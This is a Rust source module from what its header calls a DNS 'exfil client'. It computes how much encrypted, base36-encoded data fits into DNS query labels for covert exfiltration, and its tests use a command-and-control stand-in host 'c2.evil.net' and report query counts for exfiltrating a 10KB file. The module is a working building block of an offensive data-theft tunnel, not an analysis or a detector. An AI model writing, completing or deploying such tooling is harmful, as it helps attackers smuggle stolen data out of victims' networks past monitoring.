//! Shared DNS framing limits and helpers for the exfil client.

pub const DNS_MAX_NAME: usize = 253;
pub const LABEL_CAP: usize = 62;
pub const AES_GCM_OVERHEAD: usize = 28;
pub const SESSION_TAG_LEN: usize = 3;
pub const META_LABEL_PREFIX: &str = "EX";
pub const PAD_LABEL: &str = "0";
pub const ENVELOPE_LEN: usize = SESSION_TAG_LEN + 1 + 1 + 4; // version + flags + tag + counter

const LOG36_OF_2: f64 = 0.193_426_403_617_270_83;
const MAX_CHUNK_PROBE: usize = 512;

/// Estimate the number of base36 characters necessary to encode `bytes`.
/// Accounts for the 0x01 sentinel byte prepended by base36::encode.
pub fn estimate_base36_len(bytes: usize) -> usize {
    if bytes == 0 {
        return 1;
    }
    let bits = ((bytes + 1) * 8) as f64;
    (bits * LOG36_OF_2).ceil() as usize
}

/// Calculate the encoded length for a plaintext payload after optional AES-GCM wrapping + base36.
pub fn encoded_len_for_payload(plaintext_len: usize, encrypted: bool) -> usize {
    let effective_len = if encrypted {
        plaintext_len + AES_GCM_OVERHEAD
    } else {
        plaintext_len
    };
    estimate_base36_len(effective_len)
}

fn metadata_label_len(encrypted: bool) -> usize {
    META_LABEL_PREFIX.len() + encoded_len_for_payload(ENVELOPE_LEN, encrypted)
}

fn data_label_count(encoded_len: usize) -> usize {
    if encoded_len == 0 {
        1
    } else {
        (encoded_len + LABEL_CAP - 1) / LABEL_CAP
    }
}

/// Calculate total FQDN length for a given chunk size.
/// Format: <metadata_label>.<data_label1>...<data_labelN>.<domain>
/// `dot_count` = number of dot separators = total label count (one dot per label, before domain)
fn fqdn_length_for_chunk(chunk_bytes: usize, domain_len: usize, encrypted: bool) -> usize {
    if chunk_bytes == 0 {
        return 0;
    }

    let encoded_len = encoded_len_for_payload(chunk_bytes, encrypted);
    let dot_count = data_label_count(encoded_len) + 1; // +1 for metadata label's dot
    domain_len + metadata_label_len(encrypted) + encoded_len + dot_count
}

/// Returns the subdomain-only length (everything before the domain) for a given chunk size.
/// Includes metadata label, data labels, and dot separators between them.
fn subdomain_length_for_chunk(chunk_bytes: usize, encrypted: bool) -> usize {
    if chunk_bytes == 0 {
        return 0;
    }
    let encoded_len = encoded_len_for_payload(chunk_bytes, encrypted);
    let dot_count = data_label_count(encoded_len) + 1; // +1 for metadata label's dot
    metadata_label_len(encrypted) + encoded_len + dot_count
}

fn longest_domain_length(domains: &[String]) -> usize {
    domains
        .iter()
        .map(|d| d.trim().trim_end_matches('.').len())
        .max()
        .unwrap_or(0)
}

/// Compute the largest safe chunk size (in plaintext bytes) for the provided domains.
/// `max_subdomain_len`: if > 0, limits total subdomain characters (before the domain).
/// If 0, uses the full DNS budget (253 - domain_len).
pub fn max_supported_chunk_bytes(domains: &[String], max_subdomain_len: usize, encrypted: bool) -> usize {
    let domain_len = longest_domain_length(domains);
    if domain_len == 0 {
        return 0;
    }

    let mut best = 0usize;
    for chunk in 1..=MAX_CHUNK_PROBE {
        let fqdn_len = fqdn_length_for_chunk(chunk, domain_len, encrypted);
        let fqdn_ok = fqdn_len > 0 && fqdn_len <= DNS_MAX_NAME;

        // If max_subdomain_len is set, also enforce that constraint
        let subdomain_ok = if max_subdomain_len > 0 {
            subdomain_length_for_chunk(chunk, encrypted) <= max_subdomain_len
        } else {
            true
        };

        if fqdn_ok && subdomain_ok {
            best = chunk;
        } else {
            break;
        }
    }
    best
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_max_chunk_no_limit() {
        let domains = vec!["test.example.com".to_string()];
        let max = max_supported_chunk_bytes(&domains, 0, true);
        assert!(max > 0, "Should allow positive chunk size");
        assert!(max <= 300, "Chunk size {} seems unreasonably large", max);
        println!("Max chunk for 'test.example.com' (no limit): {} bytes", max);
    }

    #[test]
    fn test_max_chunk_with_subdomain_limit() {
        // Metadata label is ~60 chars, so subdomain limits must be well above that
        let domains = vec!["c2.evil.net".to_string()];
        let max_no_limit = max_supported_chunk_bytes(&domains, 0, true);
        let max_200 = max_supported_chunk_bytes(&domains, 200, true);
        let max_150 = max_supported_chunk_bytes(&domains, 150, true);
        let max_100 = max_supported_chunk_bytes(&domains, 100, true);

        assert!(
            max_200 < max_no_limit,
            "200-char limit ({}) should reduce max chunk vs no limit ({})",
            max_200, max_no_limit
        );
        assert!(
            max_150 < max_200,
            "150-char limit ({}) should reduce max chunk vs 200-char ({})",
            max_150, max_200
        );

        println!(
            "Max chunks: no-limit={}, 200={}, 150={}, 100={}",
            max_no_limit, max_200, max_150, max_100
        );
    }

    #[test]
    fn test_subdomain_limit_more_queries() {
        let domains = vec!["c2.evil.net".to_string()];
        let file_size = 10240usize; // 10KB

        let max_no_limit = max_supported_chunk_bytes(&domains, 0, true);
        let max_200 = max_supported_chunk_bytes(&domains, 200, true);
        let max_150 = max_supported_chunk_bytes(&domains, 150, true);

        assert!(max_no_limit > 0, "no-limit should be > 0");
        assert!(max_200 > 0, "200-char should be > 0");
        assert!(max_150 > 0, "150-char should be > 0");

        let queries_no_limit = (file_size + max_no_limit - 1) / max_no_limit;
        let queries_200 = (file_size + max_200 - 1) / max_200;
        let queries_150 = (file_size + max_150 - 1) / max_150;

        assert!(
            queries_200 > queries_no_limit,
            "200-char limit should need more queries: {} vs {}",
            queries_200, queries_no_limit
        );
        assert!(
            queries_150 > queries_200,
            "150-char limit should need more queries: {} vs {}",
            queries_150, queries_200
        );

        println!("10KB exfil via 'c2.evil.net':");
        println!("  No limit: {} bytes/query, {} queries", max_no_limit, queries_no_limit);
        println!("  200-char: {} bytes/query, {} queries", max_200, queries_200);
        println!("  150-char: {} bytes/query, {} queries", max_150, queries_150);
    }

    #[test]
    fn test_subdomain_length_respected() {
        let domains = vec!["test.example.com".to_string()];

        for limit in [30, 50, 80, 100] {
            let max_chunk = max_supported_chunk_bytes(&domains, limit, true);
            if max_chunk == 0 {
                continue;
            }
            let sub_len = subdomain_length_for_chunk(max_chunk, true);
            assert!(
                sub_len <= limit,
                "Subdomain length {} exceeds limit {} for chunk {}",
                sub_len, limit, max_chunk
            );

            // Verify one more byte would exceed
            let sub_len_plus = subdomain_length_for_chunk(max_chunk + 1, true);
            // It should either exceed the subdomain limit or the DNS max
            let fqdn_plus = fqdn_length_for_chunk(max_chunk + 1, 16, true);
            assert!(
                sub_len_plus > limit || fqdn_plus > DNS_MAX_NAME,
                "max_chunk+1 should exceed either subdomain limit or DNS max"
            );
        }
    }

    #[test]
    fn test_empty_domains() {
        let max = max_supported_chunk_bytes(&[], 0, true);
        assert_eq!(max, 0, "Empty domains should return 0");
    }

    #[test]
    fn test_long_domain() {
        let domains = vec!["this.is.a.very.long.domain.name.example.com".to_string()];
        let max_no_limit = max_supported_chunk_bytes(&domains, 0, true);
        let max_180 = max_supported_chunk_bytes(&domains, 180, true);

        assert!(max_no_limit > 0, "Should support some chunks with long domain");
        println!("Long domain: no-limit={}, 180-char={}", max_no_limit, max_180);

        if max_180 > 0 {
            assert!(
                max_180 <= max_no_limit,
                "Subdomain limit should not increase max chunk: {} vs {}",
                max_180, max_no_limit
            );
        }
    }
}
